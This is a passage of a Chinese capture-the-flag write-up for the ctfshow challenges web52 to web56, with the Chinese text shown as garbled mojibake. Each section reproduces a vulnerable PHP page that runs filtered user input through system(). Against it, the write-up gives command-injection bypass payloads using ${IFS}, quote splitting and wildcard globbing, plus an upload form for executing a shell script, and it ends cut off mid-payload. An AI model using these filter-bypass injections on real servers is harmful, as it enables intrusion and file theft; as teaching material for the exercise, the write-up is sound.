</code></pre><h2 id="web52"><a class="anchor" href="#web52">#</a> web52</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 22:50:30</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤äº†<span class="token operator">&lt;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload1ï¼š</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">ls</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token operator">||</span>	æ£€æŸ¥æ ¹ç›®å½•å‘ç°æœ‰flagæ–‡ä»¶</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">nl</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">/</span>fl<span class="token string single-quoted-string">''</span><span class="token class-name">ag</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token class-name">payload2</span>ï¼š</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">nl</span><span class="token variable">$IFS</span><span class="token operator">/</span>fl<span class="token string single-quoted-string">''</span><span class="token class-name">ag</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;70c7c4b8-9cf2-4c77-8028-5633a799061c&#125;
</code></pre><h2 id="web53"><a class="anchor" href="#web53">#</a> web53</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 18:21:02</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°æ·»åŠ å›æ˜¾æ‰“å°</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">nl</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span>php</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>ca<span class="token string single-quoted-string">''</span><span class="token class-name type-declaration">t</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span>php</pre></td></tr></table></figure><pre><code>ctfshow&#123;9a8e38e5-fbb1-4060-8025-6457dcb87d6e&#125;
</code></pre><h2 id="web54"><a class="anchor" href="#web54">#</a> web54</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 19:43:42</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ¢èŠ±æ ·è¿‡æ»¤ï¼Œå…¨å‘˜æ·»åŠ <span class="token operator">*</span>å·ï¼Œæ–°è¿‡æ»¤äº†nlã€scpã€rm</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload1ï¼š</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">uniq</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">.</span><span class="token operator">??</span><span class="token operator">?</span>	<span class="token comment">// ç”¨æ¥å»é™¤æ–‡æœ¬æ–‡ä»¶ä¸­è¿ç»­çš„é‡å¤è¡Œ</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">grep</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token string single-quoted-string">'&#123;'</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fl<span class="token operator">??</span><span class="token operator">.</span>php	<span class="token comment">// åœ¨ fl??.php åŒ¹é…åˆ°çš„æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾å«æœ‰ &#123;çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºåŒ…å« &#123;çš„è¿™ä¸€è¡Œ</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span><span class="token operator">?</span><span class="token class-name type-declaration">at</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>f<span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">?</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>payload2<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>ls	<span class="token comment">// å…ˆçœ‹ flag æ–‡ä»¶åæ ¼å¼</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">mv</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>fla<span class="token operator">?</span><span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>a<span class="token operator">.</span>txt	<span class="token comment">// å°† flag æ–‡ä»¶æ”¹åæˆ a.txt</span></pre></td></tr><tr><td data-num="11"></td><td><pre>ç›´æ¥è®¿é—®a<span class="token operator">.</span>txtå³å¯</pre></td></tr></table></figure><pre><code>ctfshow&#123;4e47e814-2e5f-47a0-8b02-23d0fc5cc005&#125;
</code></pre><h2 id="web55"><a class="anchor" href="#web55">#</a> web55</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 20:03:51</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿‡æ»¤æ‰åˆ†å·ã€a-zçš„å­—æ¯ã€åå•å¼•å·ã€ç™¾åˆ†å·ã€%09ã€%26ã€&lt;&gt;

payload1ï¼š
?c=/???/????64 ????.???		//åˆ©ç”¨/binæ–‡ä»¶ä¸‹base64å¾—åˆ°flag

</code></pre><p>payload2ï¼š</p><p>å…ˆæ„é€  POST æ–¹å¼ä¸Šä¼ æ•°æ®åŒ…</p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTæ•°æ®åŒ…POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://d4b9ed05-26dc-46ee-8f55-957445c8022d.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">&lt;!-- é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥ --></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ–‡ä»¶åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>ç„¶åå†ä¸Šä¼  php æ‰§è¡Œå‘½ä»¤æ–‡ä»¶</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/bin/sh</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ls</pre></td></tr></table></figure><p>å†æŠ“åŒ…</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230131172326458.png" alt="image-20230131172326458"></p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230131172419233.png" alt="image-20230131172419233"></p><pre><code>ctfshow&#123;6f8b48b6-9bc6-4c7e-b670-9dbf64a9c70f&#125;
</code></pre><h2 id="web56"><a class="anchor" href="#web56">#</a> web56</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\'|\"|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>è¿‡æ»¤æ‰äº†æ•°å­—</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>åŒweb55æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>payload</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token 